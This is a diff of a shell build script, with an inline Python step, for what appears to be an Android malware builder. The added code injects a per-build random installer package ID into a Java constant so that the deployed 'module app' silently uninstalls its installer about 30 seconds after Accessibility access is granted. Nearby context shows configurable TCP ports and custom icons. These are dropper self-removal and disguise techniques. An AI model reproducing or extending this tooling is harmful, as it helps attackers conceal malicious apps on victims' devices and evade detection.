@@ -691,6 +691,27 @@ PYEOF
         echo "  TCP_PORT = $BUILD_TCP_PORT"
     fi
 
+    # Patch Constants.java AUTO_UNINSTALL_PACKAGE with the installer's package ID.
+    # The module app silently uninstalls the installer ~30s after Accessibility connects.
+    # The installer package ID is randomly generated each build, so it must be injected here.
+    if [ -n "${BUILD_INSTALLER_PACKAGE:-}" ] && [ -f "$APP_CONSTANTS" ]; then
+        [ ! -f "$APP_CONSTANTS_BAK" ] && cp "$APP_CONSTANTS" "$APP_CONSTANTS_BAK"
+        BUILD_INSTALLER_PACKAGE="$BUILD_INSTALLER_PACKAGE" python3 - "$APP_CONSTANTS" << 'PYEOF'
+import sys, os, re
+path = sys.argv[1]
+pkg = os.environ['BUILD_INSTALLER_PACKAGE']
+with open(path, 'r', encoding='utf-8') as f: src = f.read()
+new = re.sub(
+    r'(public\s+static\s+final\s+String\s+AUTO_UNINSTALL_PACKAGE\s*=\s*")[^"]*(")',
+    lambda m: m.group(1) + pkg + m.group(2),
+    src, count=1
+)
+with open(path, 'w', encoding='utf-8') as f: f.write(new)
+print(f"  Constants.java AUTO_UNINSTALL_PACKAGE = {pkg}")
+PYEOF
+        echo "  AUTO_UNINSTALL_PACKAGE = $BUILD_INSTALLER_PACKAGE"
+    fi
+
     # ── Custom app icons ──────────────────────────────────────────────────────
     # Helper: download or base64-decode an icon URL, resize to all mipmap
     # densities using Pillow, and write ic_launcher.png / ic_launcher_round.png
